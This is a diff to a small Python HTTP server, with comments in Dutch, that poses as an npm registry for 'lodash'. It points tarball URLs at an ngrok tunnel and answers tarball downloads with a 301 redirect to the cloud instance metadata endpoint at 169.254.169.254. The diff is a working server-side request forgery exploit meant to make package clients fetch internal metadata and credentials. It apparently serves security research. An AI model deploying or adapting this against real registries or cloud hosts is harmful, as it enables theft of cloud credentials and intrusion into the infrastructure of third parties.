@@ -1,6 +1,7 @@
 import json
 from http.server import HTTPServer, BaseHTTPRequestHandler
 
+NGROK = "https://d511-84-30-51-191.ngrok-free.app"
 INTERNAL = "http://169.254.169.254/latest/meta-data/"
 
 PACKUMENT = json.dumps({
@@ -11,7 +12,7 @@ PACKUMENT = json.dumps({
             "name": "lodash",
             "version": "4.19.0",
             "dist": {
-                "tarball": INTERNAL + "lodash-4.19.0.tgz",
+                "tarball": NGROK + "/lodash/-/lodash-4.19.0.tgz",
                 "shasum": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
             }
         },
@@ -19,7 +20,7 @@ PACKUMENT = json.dumps({
             "name": "lodash",
             "version": "4.17.21",
             "dist": {
-                "tarball": INTERNAL + "lodash-4.17.21.tgz",
+                "tarball": NGROK + "/lodash/-/lodash-4.17.21.tgz",
                 "shasum": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
             }
         }
@@ -35,10 +36,19 @@ class Handler(BaseHTTPRequestHandler):
             if k.lower() != "user-agent":
                 print(f"  {k}: {v}")
 
+        # Tarball download request -> redirect naar IMDS
+        if self.path.endswith(".tgz"):
+            print(f"[!!!] TARBALL REQUEST -> redirect naar {INTERNAL}")
+            self.send_response(301)
+            self.send_header("Location", INTERNAL)
+            self.end_headers()
+            return
+
+        # Packument request (npm of excon)
         if "npm/" in ua:
-            print(f"[!] npm client -> packument met IMDS tarball URL")
+            print(f"[!] npm packument -> HTTPS tarball URLs serveren")
         else:
-            print(f"[*] excon -> packument serveren")
+            print(f"[*] excon packument -> serveren")
 
         self.send_response(200)
         self.send_header("Content-Type", "application/json")
